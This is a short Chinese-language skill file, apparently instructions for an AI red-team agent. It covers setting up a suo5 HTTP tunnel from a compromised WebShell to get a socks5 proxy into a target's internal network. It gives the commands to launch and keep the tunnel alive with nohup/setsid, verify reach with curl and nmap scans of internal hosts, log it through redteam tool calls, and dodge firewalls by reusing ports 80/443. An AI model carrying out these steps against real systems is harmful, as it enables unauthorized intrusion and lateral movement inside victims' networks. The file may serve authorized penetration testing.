---
name: suo5-tunnel
description: suo5 HTTP 隧道：从 WebShell 建 socks5，穿透性好、无需 VPS
tags: tunnel, suo5
---

# suo5 HTTP 隧道

> 优点：**只需要一个可执行的 WebShell 或能起进程**，不需要 VPS，走 HTTP 不容易被拦。
> 缺点：带宽低，适合交互式操作，不适合大流量传输。

## 服务端（目标侧）

上传对应平台二进制后启动（放在可写目录，权限 755）：

```bash
chmod +x suo5-linux-amd64
./suo5-linux-amd64 -l 0.0.0.0:8080
```

Windows：

```powershell
.\suo5-windows-amd64.exe -l 0.0.0.0:8080
```

如果只能通过 WebShell 执行命令，就用 WebShell 起这个进程（注意别让进程随会话退出：`nohup ... &`）。

## 客户端（本地）

```bash
./suo5 -t http://<target>:8080 -l 127.0.0.1:1080
```

- `-t` 目标侧监听地址（就是上面的 8080）
- `-l` 本地 socks5 监听

## 验证（不许跳过）

```bash
curl -x socks5://127.0.0.1:1080 http://<内网IP>/ -m 5 -i
nmap -sT -Pn -p 22,80,3389 <内网IP> --proxies socks4://127.0.0.1:1080
```

拿到响应 → 记录可达网段；拿不到 → 隧道没打通。

## 落库

```
redteam_tunnel_add({
  entryKind: 'target-http',
  listen: 'socks5://127.0.0.1:1080',
  reachable: '10.0.0.0/24'
})
redteam_tunnel_update({ id, verified: true })   // 实测通后
```

## 判定标准

- [ ] 目标侧进程在跑（`ps` 能看到）
- [ ] 本地能用代理访问到真实内网目标
- [ ] `entryKind` 写的是 `target-http`（不是自建 VPS）

## 常见坑

| 坑 | 处理 |
|---|---|
| 进程随 WebShell 会话退出 | `nohup` / `setsid` |
| 只测本地端口通不通 | 必须访问真实内网目标 |
| 端口被防火墙拦 | 复用 80/443，或用 WebShell 所在端口 |
| 带宽太小以为挂了 | suo5 本来就慢，先测小请求 |
